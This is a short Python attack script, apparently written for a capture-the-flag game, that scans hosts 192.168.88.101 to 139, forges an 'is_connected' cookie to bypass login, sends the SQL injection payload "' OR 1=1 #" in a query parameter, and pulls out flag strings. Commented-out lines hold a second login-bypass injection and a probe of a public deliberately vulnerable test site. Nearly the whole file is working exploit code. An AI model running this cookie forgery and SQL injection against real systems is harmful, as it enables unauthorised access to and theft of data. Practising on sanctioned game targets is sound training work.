#!/usr/bin/env python3



from socket import SHUT_RDWR, create_connection
from time import sleep
from tokenize import cookie_re
import requests as req
import re

p = re.compile('fl\{.*\}')

timeouts = [101,105,106,107,108,109,117,119,121,133,136]

#reqy = req.post("http://testphp.vulnweb.com/userinfo.php", data={	"uname": "test",	"pass": "test"})
#print(reqy.cookies)
for i in range(101,140):

  serverAdress = f"192.168.88.{i}"
  url = "http://" + serverAdress
  # loginval ={	"username": "'OR+1=1#",	"password": "blah",	"submit": "SIGN+IN"}
  # r = req.post(url + "/login.php" , data=loginval, timeout=3)
  # print(r.cookies)
  cookie_jar = {'is_connected': "1"}
  params = {'sender': "' OR 1=1 #"}
  
  newR = req.get("http://" + serverAdress+"/index.php", params=params, cookies=cookie_jar)
  byties = newR.content
  string = str(byties)

  try:
  #  print(byties.decode(errors='replace'))
    print(f"{i}: {p.findall(byties.decode(errors='replace'))}")
  except:
    print(f"{i}: timeout")

